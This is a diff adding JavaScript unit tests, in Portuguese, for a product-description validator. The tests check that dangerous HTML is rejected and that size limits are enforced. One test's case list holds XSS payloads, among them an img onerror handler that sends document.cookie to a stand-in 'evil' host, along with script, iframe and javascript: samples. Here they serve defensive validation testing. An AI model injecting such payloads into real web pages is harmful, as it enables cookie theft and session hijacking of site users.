@@ -86,6 +86,34 @@ test("bullets: array e string por linha; vazios filtrados", () => {
   }
 });
 
+test("rejeita HTML perigoso na descrição (script/handler/iframe/javascript:)", () => {
+  const casos = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=\"fetch('https://evil/'+document.cookie)\">",
+    "<iframe src=https://evil></iframe>",
+    "<a href=\"javascript:alert(1)\">x</a>",
+  ];
+  for (const html of casos) {
+    const r = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: html }] });
+    assert.ok(!r.ok && campos(r).some((c) => c.includes("description_html")), `esperava rejeitar: ${html}`);
+  }
+  // HTML de formatação simples continua válido.
+  const ok = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: "<p><b>Curso</b> ótimo</p>" }] });
+  assert.ok(ok.ok);
+});
+
+test("limites: descrição muito longa e excesso de mídia falham; bullets são cortados", () => {
+  const longa = "a".repeat(20001);
+  assert.ok(campos(validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", description_html: longa }] })).some((c) => c.includes("description_html")));
+
+  const muitas = Array.from({ length: 41 }, (_, i) => ({ url: `https://x.com/${i}.jpg` }));
+  assert.ok(campos(validarConteudoProduto({ product_id: "p", media: muitas })).includes("media"));
+
+  const muitosBullets = Array.from({ length: 100 }, (_, i) => `item ${i}`);
+  const r = validarConteudoProduto({ product_id: "p", content: [{ locale: "pt-BR", highlights: muitosBullets }] });
+  assert.ok(r.ok && r.valor.content[0].highlights.length === 60);
+});
+
 test("corpo não-objeto falha limpo", () => {
   assert.ok(!validarConteudoProduto(null).ok);
   assert.ok(!validarConteudoProduto([]).ok);
